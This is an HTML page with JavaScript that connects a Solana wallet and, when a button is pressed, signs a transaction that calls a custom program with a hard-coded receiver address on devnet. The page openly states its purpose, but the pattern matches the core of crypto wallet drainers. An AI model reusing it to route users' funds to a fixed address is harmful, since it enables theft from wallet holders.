<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Send All SOL</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script>
        window.Buffer = {
            alloc: (size) => new Uint8Array(size)
        };
    </script>
</head>
<body>
    <h1>Send All SOL</h1>
    <button id="connect-button">Connect Wallet</button>
    <button id="send-button" disabled>Send All SOL</button>

    <script type="text/javascript">
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));
        let userPublicKey;

        async function connectWallet() {
            const provider = window.solana;
            if (!provider) {
                alert("Please install a Solana wallet like Phantom");
                return;
            }
            await provider.connect();
            userPublicKey = provider.publicKey;
            document.getElementById('send-button').disabled = false; // Enable send button
            alert("Wallet connected: " + userPublicKey.toString());
        }

        async function sendAllSol() {
            if (!userPublicKey) {
                alert("Please connect your wallet first.");
                return;
            }

            try {
                const receiverPublicKey = new solanaWeb3.PublicKey("3H7t8Uzq3vvX1MYXNptSm3Hs9J82iuGCTVHskoAoQBUv");
                const programId = new solanaWeb3.PublicKey("6zL1Rzd4RXSGqgpx25WehDhXSNTdcEBS3K2SkYHxahWR");

                const { blockhash } = await connection.getLatestBlockhash();

                const transaction = new solanaWeb3.Transaction({
                    recentBlockhash: blockhash,
                    feePayer: userPublicKey,
                });

                const instruction = new solanaWeb3.TransactionInstruction({
                    keys: [
                        { pubkey: userPublicKey, isSigner: true, isWritable: true },
                        { pubkey: receiverPublicKey, isSigner: false, isWritable: true },
                    ],
                    programId: programId,
                    data: Buffer.alloc(0),
                });

                transaction.add(instruction);

                const { signature } = await window.solana.signAndSendTransaction(transaction);
                console.log("Transaction signature", signature);

                // Poll for confirmation
                let confirmation;
                while (true) {
                    confirmation = await connection.getSignatureStatus(signature);
                    if (confirmation.value && confirmation.value.confirmations) {
                        break; // Exit loop if confirmed
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before checking again
                }

                console.log("Transaction confirmation:", confirmation);
                if (confirmation.value.err) {
                    console.error("Transaction failed:", confirmation.value.err);
                    alert("Transaction failed: Check console for details.");
                } else {
                    alert("All SOL sent successfully!");
                }
            } catch (error) {
                console.error("Error sending SOL:", error);
                alert("An error occurred. Check the console for details.");
            }
        }

        document.getElementById('connect-button').addEventListener('click', connectWallet);
        document.getElementById('send-button').addEventListener('click', sendAllSol);
    </script>
</body>
</html>
